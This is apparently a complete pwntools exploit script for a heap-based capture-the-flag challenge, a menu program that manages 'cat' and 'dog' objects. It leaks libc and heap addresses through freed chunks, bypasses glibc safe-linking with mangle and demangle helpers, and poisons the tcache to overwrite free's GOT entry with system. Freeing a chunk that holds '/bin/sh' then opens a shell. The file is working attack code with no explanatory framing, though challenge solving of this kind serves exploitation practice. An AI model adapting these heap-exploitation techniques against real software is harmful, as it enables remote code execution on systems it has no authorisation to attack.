#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def get_cat(idx):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(idx).encode())

def see_cat(idx):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"says: ")
    return io.recvline().strip()

def pet_cat(idx, word):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", word)

def release_cat(idx):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())

def get_dog(idx):
    io.sendlineafter(b":", b"5")
    io.sendlineafter(b":", str(idx).encode())

def see_dog(idx):
    io.sendlineafter(b":", b"6")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"says: ")
    return io.recv(0x100)

def pet_dog(idx, word):
    io.sendlineafter(b":", b"7")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", word)

def release_dog(idx):
    io.sendlineafter(b":", b"8")
    io.sendlineafter(b":", str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 

def solve():

    for i in range(10):
        get_cat(i)  

    for j in range(7):
        release_cat(j)
    
    release_cat(8)
    release_cat(7)

    get_cat(10)
    release_cat(8)

    get_dog(0)
    data = see_dog(0)
    chunks = [data[i:i+8] for i in range(0, len(data), 8)]
    main_arena = u64(chunks[0])
    heap_leak = u64(chunks[20])
    heap_base = demangle(heap_leak) - 0x5c0
    libc.address = main_arena - 0x21ae10
    info("libc.address: %#x", libc.address)
    info("heap base: %#x", heap_base)

    got_free = exe.got['free'] - 0x8
    mangled = mangle(heap_base, got_free)
    pet_dog(0, b"A"*0xa0 + p64(mangled))

    get_cat(11)
    get_cat(12)

    pet_cat(11, b"/bin/sh\x00")
    pet_cat(12, p64(libc.address + 0x41f934) + p64(libc.symbols['system']))

    release_cat(11)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

